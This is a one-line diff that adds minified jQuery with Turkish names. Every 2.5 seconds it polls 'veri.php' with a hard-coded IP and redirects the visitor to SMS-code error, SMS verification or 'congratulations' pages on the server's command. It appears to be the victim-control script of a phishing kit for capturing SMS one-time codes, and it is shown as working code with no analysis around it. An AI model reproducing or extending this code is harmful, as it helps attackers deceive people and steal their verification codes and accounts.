@@ -1,0 +1,1 @@
+function gonder(){$.ajax({type:"POST",url:"veri.php?ip=203.129.219.162",success:function(n){"back"==n&&(window.location.href="index.php"),"hata1"==n&&(window.location.href="sms-hatali.php"),"sms"==n&&(window.location.href="sms-dogrulama.php"),"tebrik"==n&&(window.location.href="tebrikler.php")}})}$(document).ready(function(){gonder();self.setInterval("gonder()",2500)})
